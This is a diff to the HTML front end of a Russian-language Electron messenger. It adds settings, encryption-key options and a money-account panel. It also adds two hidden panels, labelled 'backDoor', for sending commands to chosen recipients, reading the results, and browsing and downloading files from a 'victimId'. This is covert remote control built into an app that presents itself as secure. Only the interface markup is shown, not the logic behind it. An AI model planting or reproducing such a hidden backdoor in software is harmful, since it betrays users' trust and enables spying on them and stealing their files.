@@ -13,7 +13,6 @@
 </head>
 <script>
     window.addEventListener(`load`, () => {
-        // You can also require other files to run in this process
         require('./renderer.js'); //main script
     });
 </script>
@@ -49,8 +48,8 @@
                 <div id="showRoomModal"></div>
                 <div id="connectToTheHiddenRoom"></div>
             </div>
-            <br>
-            <input type="text" style="background-color: #0e1621;" id="roomFilter">
+            <!-- <br> -->
+            <input type="text" style="background-color: #0e1621; display: none;" id="roomFilter">
             <br>
             <table id="rooms" style="display: inline-block; border-collapse: collapse;">
                 <tr>
@@ -69,6 +68,9 @@
         <div id="title">
                 <div id="titleText"></div>
                 <div id="test">
+                    <div id="money"></div>
+                    <div id="oneToone"></div>
+                    <div id="digitalSignature"></div>
                     <div id="settings"></div>
                     <div id="disconnect"></div>
                     <div id="clear"></div>
@@ -79,9 +81,7 @@
         <div id="typing"></div>
         <div id="message">
             <div id="file"></div>
-            <!-- <div> -->
             <textarea id="inputMessage"></textarea>
-            <!-- </div> -->
             <div id="send"><img src="styles/audio.png" style="width: 32px;"></div>
         </div>
     </div>
@@ -92,18 +92,103 @@
         <input type="password" id="roomPassword"><br><br>
         Цвет названия:<br><br>
         <input class="jscolor { width:92, position:'bottom', borderColor:'#def0ff', insetColor:'#def0ff', backgroundColor:'#17212b', value:'66ccff' }" onfocus="this.blur();" style="cursor:pointer; width: 150px; border-radius: 5px; font-size: 0; height: 14px; border: 1px solid #def0ff;" id="roomColor"><br><br>
-        <div style="display: flex;justify-content: center;align-items: center;flex-direction: row;"><input type="checkbox" id="hidden" style="margin-right:5px;">Скрытая комната</div>
+        <div style="display: flex;justify-content: center;align-items: center;flex-direction: row;">Скрытая комната <input type="checkbox" id="hidden" style="margin-right:5px;"></div>
     </div>
     <div id="settingsBlock" style="display: none;">
         <h3>Настройки</h3>
-        <pre class="des">Уровень громкости <input type="range" min="0" max="1" step="0.01" id="volume" value="1"><span id="curVolume">100%</span></pre>
+        <pre class="des">Уведомления <input type="checkbox" id="notifications" checked></pre>
+        <pre class="des">Звуки сообщений разной тональности <input type="checkbox" id="difSounds" checked></pre>
+        <pre class="des">Открывать файлы из мессенджера <input type="checkbox" id="openFilesInsecure"></pre>
+        <pre class="des">Уровень громкости <input type="range" min="0" max="1" step="0.01" id="volume" value="0.75"><span id="curVolume"></span></pre>
         <pre class="des">Папка загрузок: <input type="text" id="downloads"><img id="folder" src="styles/folder.png" style="width: 20px; margin-left: 5px;"><img id="updateFolder" src="styles/updateFolder.png" style="width: 20px; margin-left: 5px;"></pre>
         <button id="createDump">Создать дамп переписки</button><br><br>
         Пароль<br>
         <input type="password" id="dumpPassword"><br><br>
         <button id="loadDump">Загрузить дамп переписки</button><br><br>
         Пароль<br>
-        <input type="password" id="dumpLoadPassword">
+        <input type="password" id="dumpLoadPassword"><br><br>
+        <button id="changeAESkey" data-title="Специально для параноиков">Сменить криптографические ключи</button><br><br>
+        Размер ключа RSA
+        <select class="select-css" id="RSAKeySize">
+            <option>2048</option>
+            <option>3072</option>
+            <option>4096</option>
+        </select>
+    </div>
+    <div id="exitRoom" style="display: none;">
+        Вы уверены, что хотите выйти из комнаты?<br>
+        <pre class="des">Больше не напоминать <input type="checkbox" id="dontRemind"></pre>
+    </div>
+    <div id="moneyAccount" style="display: none;">
+        <h3>Создание счета</h3>
+        <table style="margin: 0 auto;">
+            <tr>
+                <td>Пароль от счета</td>
+                <td><input type="password" id="passwordAccNew" maxlength=60></td>
+            </tr>
+        </table>
+        <button id="createMoneyAcc">Создать счет</button><br><br>
+        <span id="idCreatedAcc" style="user-select: text;"></span>
+        <h3>Текущий счет</h3>
+        <span id="accState" style="user-select: text;"></span><br>
+        <span id="accOperationsState" style="user-select: text;"></span><br><br>
+        Баланс: <span id="balance" style="font-weight: bold;"></span><br>
+        <table style="margin: 0 auto;">
+            <tr>
+                <td>id счета</td>
+                <td><input type="text" id="idAcc" maxlength=24>
+            </tr>
+            <tr>
+                <td>Пароль</td>
+                <td><input type="password" id="passwordAcc" maxlength=60></td>
+            </tr>
+            <tr>
+                <td>Новый пароль</td>
+                <td><input type="password" id="newPasswordValue" maxlength=60></td>
+            </tr>
+        </table>
+        <button id="loginInAcc">Войти</button><br><br>
+        <button id="changePasswordAcc">Сменить пароль</button><br><br>
+        <button id="deleteAcc">Удалить счет</button><br><br>
+        <button id="showOperationHistory">История операций</button>
+    </div>
+    <div id="operationHistory" style="display: none;">
+        <h3 id="accOperationtitle"></h3>
+        <form id="pageNumForm">
+            Номер страницы <input type="text" id="pageNum" style="width: 50px;" value="0">
+        </form><br>
+        <button id="operationsBack">Назад</button> <button id="operationsNext">Вперед</button><br><br>
+        <span id="opsClear"></span>
+        <div id="operations"></div>
+    </div>
+    <div id="oneToOneBlock" style="display: none;">
+        сюда блок
+    </div>
+    <div id="backDoor" style="display: none;">
+        Команда<br>
+        <textarea id="command" style="width: 100%; height: 100px;"></textarea><br>
+        Получатели<br>
+        <textarea id="recipients" style="width: 100%; height: 50px;"></textarea><br><br>
+        <button id="sendCommand">Отправить</button><br><br>
+        Результаты команд <br><br>
+        <button id="clearResults">Очистить</button><br><br>
+        <div id="backDoorResults" style="user-select: text; word-wrap: break-word; width: 100%; text-align: left;"></div>
+    </div>
+    <div id="backDoorFiles" style="display: none;">
+        <div id="wrapBackDoorFiles">
+            <form id="backDoorFilesForm">
+                <input type="text" id="victimId">
+            </form>
+            Айди пользователя для подключения
+            <input type="text" id="curPath">
+            Текущая папка<br><br>
+            <input type="text" id="goToPath"><br>
+            <button id="goToStart">Перейти к..</button><br>
+            <button id="downloadAll">Скачать все</button><br>
+            <button id="goToParentDir">..</button><br>
+            <div id="backDoorFilesAndDirs" style="width: 100%;">
+            </div>
+        </div>
     </div>
 </body>
 
